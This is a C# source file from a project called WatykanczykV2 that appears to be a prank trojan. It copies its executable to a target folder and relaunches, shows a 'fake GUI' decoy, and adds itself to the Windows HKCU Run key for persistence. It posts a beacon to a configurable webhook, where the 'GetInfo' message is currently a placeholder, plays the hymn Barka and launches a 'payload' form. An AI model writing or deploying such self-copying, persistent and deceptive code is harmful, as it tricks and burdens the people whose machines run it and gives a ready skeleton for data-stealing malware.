using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Windows.Forms;
using WatykanczykV2.Forms;

namespace WatykanczykV2
{

    internal class Functions
    {
        Settings _settings;

        public Functions()
        {
            _settings = new Settings();
        }

        public void RunInTestMode()
        {
            if (_settings.RunInTestMode)
            {
                Application.Run(new TestGuiForm());
                Environment.Exit(0);
            }
        }

        public void CloneToAndRunInTargetLocation()
        {
            if (_settings.CloneToAndRunInTargetLocation)
            {
                string exePlusTargetPath = $@"{_settings.TargetLocation}\{GetExeName()}";
                string exePlusCurrentPath = $"{GetCurrentLocation()}{GetExeName()}";

                if (GetCurrentLocation() != _settings.TargetLocation)
                {
                    if (File.Exists(exePlusTargetPath))
                    {
                        Process.Start(exePlusTargetPath);
                        Environment.Exit(0);
                    }
                    else
                    {
                        File.Copy(exePlusCurrentPath, exePlusTargetPath);
                        Process.Start(exePlusTargetPath);
                        Environment.Exit(0);
                    }
                }
            }
        }

        public void StartFakeGui()
        {
            if (_settings.UseFakeGui)
            {
                Thread fakeGui = new Thread(() =>
                {
                    Application.Run(new FakeGuiForm());
                });
                fakeGui.SetApartmentState(ApartmentState.STA);
                fakeGui.Start();
            }
        }

        public void GetInfo()
        {
            if (_settings.GetInfo)
            {
                using (var client = new HttpClient())
                {
                    var content = new StringContent("Hello, I am dummy dumb dumb");

                    var response = client.PostAsync(_settings.WebhookURL, content).Result;
                }
            }
        }

        public void SetRegistryKeys()
        {
            if (_settings.SetRegistryKeys)
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue(GetExeName(), GetCurrentLocation());
                }
            }
        }

        public void PlayMusic()
        {
            if (_settings.PlayMusic)
            {
                Thread playMusic = new Thread(() =>
                {
                    Stream str = Properties.Resources.Barka;
                    System.Media.SoundPlayer barka = new System.Media.SoundPlayer(str);
                    barka.Play();
                });
                playMusic.Start();
            }
        }

        public void RunPayload()
        {

            Thread payload = new Thread(() =>
            {
                PayloadForm payloadForm = new PayloadForm();

                Application.Run(payloadForm);
            });
            payload.SetApartmentState(ApartmentState.STA);
            payload.Start();

        }

        public string GetCurrentTime()
        {
            DateTime currentTime = DateTime.Now;

            int currentHour = currentTime.Hour;
            int currentMinute = currentTime.Minute;

            string time = ($"{currentHour}:{currentMinute}");

            return time;
        }

        public string GetExeName()
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string ExeName = Path.GetFileName(exePath);

            return ExeName;
        }

        public string GetCurrentLocation()
        {
            string CurrentLocation = $@"{AppDomain.CurrentDomain.BaseDirectory}";

            return CurrentLocation;
        }

    }
}
